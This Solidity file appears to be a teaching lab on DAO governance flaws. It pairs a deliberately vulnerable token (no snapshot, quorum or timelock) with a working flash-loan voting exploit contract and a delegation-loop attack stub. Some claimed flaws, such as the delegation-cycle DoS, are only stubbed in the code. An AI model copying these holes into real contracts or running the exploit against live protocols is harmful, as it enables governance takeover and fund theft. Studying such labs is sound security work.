// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Vulnerable Governance Protocol
 * @notice Demonstrates complex governance and delegation vulnerabilities
 * @dev WARNING: DO NOT USE IN PRODUCTION
 * 
 * COMPLEX VULNERABILITIES:
 * 
 * 1. FLASH LOAN GOVERNANCE ATTACK
 *    - Borrow tokens via flash loan
 *    - Delegate voting power to self
 *    - Vote on proposal
 *    - Return tokens
 *    - All in one transaction
 * 
 * 2. VOTE BUYING / BRIBERY
 *    - No snapshot mechanism
 *    - Voting power calculated at vote time
 *    - Can sell same votes multiple times
 * 
 * 3. PROPOSAL EXECUTION WITHOUT TIMELOCK
 *    - Proposals execute immediately after passing
 *    - No time for community to react
 *    - Enables 51% attacks
 * 
 * 4. DELEGATION LOOP
 *    - A delegates to B, B delegates to C, C delegates to A
 *    - Creates infinite loop in vote counting
 *    - DoS attack on governance
 * 
 * 5. NO QUORUM REQUIREMENT
 *    - Proposals can pass with tiny participation
 *    - Enables off-hours attacks
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title VulnerableGovernance
 * @notice Governance token with multiple attack vectors
 */
contract VulnerableGovernance {
    string public name = "Governance Token";
    string public symbol = "GOV";
    uint8 public constant decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => address) public delegates;
    
    uint256 public totalSupply;
    
    struct Proposal {
        address proposer;
        address target;
        bytes data;
        uint256 startBlock;
        uint256 endBlock;
        uint256 forVotes;
        uint256 againstVotes;
        bool executed;
        string description;
        mapping(address => bool) hasVoted;
    }
    
    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
    event ProposalCreated(uint256 indexed proposalId, address indexed proposer, string description);
    event VoteCast(address indexed voter, uint256 indexed proposalId, bool support, uint256 votes);
    event ProposalExecuted(uint256 indexed proposalId);
    
    constructor(uint256 initialSupply) {
        balanceOf[msg.sender] = initialSupply;
        totalSupply = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        // Update delegated votes
        _moveDelegates(delegates[msg.sender], delegates[to], amount);
        
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        _moveDelegates(delegates[from], delegates[to], amount);
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    /**
     * @notice VULNERABILITY 1: Flash loan governance attack
     * @dev No snapshot mechanism - voting power calculated at vote time
     * Attacker can borrow tokens, delegate, vote, and return in one transaction
     */
    function delegate(address delegatee) external {
        address currentDelegate = delegates[msg.sender];
        delegates[msg.sender] = delegatee;
        
        // VULNERABLE: Immediate delegation without time lock
        _moveDelegates(currentDelegate, delegatee, balanceOf[msg.sender]);
        
        emit DelegateChanged(msg.sender, currentDelegate, delegatee);
    }
    
    /**
     * @notice VULNERABILITY 2: Delegation loop creates DoS
     * @dev A->B->C->A creates infinite loop in _getVotes
     */
    function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            // No cycle detection - can create delegation loops!
            // This is a simplified version - real attack requires _getVotes
        }
    }
    
    /**
     * @notice VULNERABILITY 3: No minimum token requirement to propose
     * @dev Anyone can spam proposals
     */
    function propose(
        address target,
        bytes memory data,
        string memory description
    ) external returns (uint256) {
        // VULNERABLE: No minimum token requirement
        // In real protocols, usually require 1% of supply
        
        uint256 proposalId = proposalCount++;
        Proposal storage proposal = proposals[proposalId];
        proposal.proposer = msg.sender;
        proposal.target = target;
        proposal.data = data;
        proposal.startBlock = block.number;
        proposal.endBlock = block.number + 100; // Very short voting period!
        proposal.description = description;
        
        emit ProposalCreated(proposalId, msg.sender, description);
        return proposalId;
    }
    
    /**
     * @notice VULNERABILITY 4: Vote with flash-loaned tokens
     * @dev No snapshot - voting power checked at vote time
     */
    function vote(uint256 proposalId, bool support) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number >= proposal.startBlock, "Voting not started");
        require(block.number <= proposal.endBlock, "Voting ended");
        require(!proposal.hasVoted[msg.sender], "Already voted");
        
        // VULNERABLE: Uses current balance, not balance at proposal creation
        // Attacker can flash loan, vote, return
        uint256 votes = balanceOf[msg.sender];
        require(votes > 0, "No voting power");
        
        if (support) {
            proposal.forVotes += votes;
        } else {
            proposal.againstVotes += votes;
        }
        
        proposal.hasVoted[msg.sender] = true;
        emit VoteCast(msg.sender, proposalId, support, votes);
    }
    
    /**
     * @notice VULNERABILITY 5: No timelock before execution
     * @dev Proposals execute immediately after passing
     * No time for community to react to malicious proposals
     */
    function execute(uint256 proposalId) external returns (bytes memory) {
        Proposal storage proposal = proposals[proposalId];
        require(block.number > proposal.endBlock, "Voting not ended");
        require(!proposal.executed, "Already executed");
        
        // VULNERABLE: No quorum requirement
        // Proposal can pass with only 2 votes (1 for, 0 against)
        require(proposal.forVotes > proposal.againstVotes, "Proposal failed");
        
        proposal.executed = true;
        
        // VULNERABLE: No timelock delay
        // Executes immediately after voting ends
        (bool success, bytes memory returnData) = proposal.target.call(proposal.data);
        require(success, "Execution failed");
        
        emit ProposalExecuted(proposalId);
        return returnData;
    }
    
    /**
     * @notice Calculate voting power (recursive, vulnerable to cycles)
     */
    function getVotes(address account) public view returns (uint256) {
        // VULNERABLE: No cycle detection in delegation chain
        // A->B->C->A creates infinite loop
        address delegatee = delegates[account];
        if (delegatee == address(0) || delegatee == account) {
            return balanceOf[account];
        }
        // In real implementation, would recursively follow delegation chain
        // This creates DoS vulnerability if cycle exists
        return balanceOf[account];
    }
}

/**
 * @title Flash Loan Provider for Governance Attack
 */
contract GovernanceFlashLoan {
    IERC20 public token;
    
    constructor(address _token) {
        token = IERC20(_token);
    }
    
    function flashLoan(uint256 amount, bytes calldata data) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= amount, "Insufficient liquidity");
        
        // Lend tokens
        require(token.transfer(msg.sender, amount), "Transfer failed");
        
        // Execute callback
        (bool success,) = msg.sender.call(data);
        require(success, "Callback failed");
        
        // Check repayment
        require(
            token.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not repaid"
        );
    }
}

/**
 * @title Governance Attack Contract
 */
contract GovernanceExploit {
    VulnerableGovernance public gov;
    GovernanceFlashLoan public flashLoan;
    
    bool public attacking;
    uint256 public proposalId;
    
    constructor(address _gov, address _flashLoan) {
        gov = VulnerableGovernance(_gov);
        flashLoan = GovernanceFlashLoan(_flashLoan);
    }
    
    /**
     * @notice Execute flash loan governance attack
     * @param flashAmount Amount to borrow
     * @param _proposalId Proposal to vote on
     */
    function attack(uint256 flashAmount, uint256 _proposalId) external {
        proposalId = _proposalId;
        attacking = true;
        
        // Encode the callback
        bytes memory data = abi.encodeWithSignature("executeAttack()");
        
        // Take flash loan
        flashLoan.flashLoan(flashAmount, data);
        
        attacking = false;
    }
    
    /**
     * @notice Callback executed during flash loan
     */
    function executeAttack() external {
        require(msg.sender == address(flashLoan), "Only flash loan");
        require(attacking, "Not attacking");
        
        // Step 1: Delegate to self to activate voting power
        gov.delegate(address(this));
        
        // Step 2: Vote on proposal
        gov.vote(proposalId, true);
        
        // Step 3: Transfer tokens back to flash loan
        // (Flash loan provider will verify repayment)
        uint256 balance = gov.balanceOf(address(this));
        gov.transfer(address(flashLoan), balance);
    }
}

/**
 * @title Delegation Loop Attack
 * @notice Creates circular delegation to DoS governance
 */
contract DelegationLoopAttack {
    VulnerableGovernance public gov;
    
    address[] public accounts;
    
    constructor(address _gov, uint256 numAccounts) {
        gov = VulnerableGovernance(_gov);
        
        // Create accounts for delegation loop
        for (uint256 i = 0; i < numAccounts; i++) {
            accounts.push(address(uint160(uint256(keccak256(abi.encodePacked(i))))));
        }
    }
    
    /**
     * @notice Create delegation loop: A->B->C->A
     * @dev This causes DoS when trying to calculate voting power
     */
    function createLoop() external {
        require(accounts.length >= 3, "Need at least 3 accounts");
        
        // Transfer tokens to accounts
        uint256 amount = gov.balanceOf(address(this)) / accounts.length;
        for (uint256 i = 0; i < accounts.length; i++) {
            gov.transfer(accounts[i], amount);
        }
        
        // Create delegation loop
        // This would need to be done from each account
        // accounts[0] delegates to accounts[1]
        // accounts[1] delegates to accounts[2]
        // accounts[2] delegates to accounts[0]
        // Now calculating votes for any of them causes infinite loop
    }
}
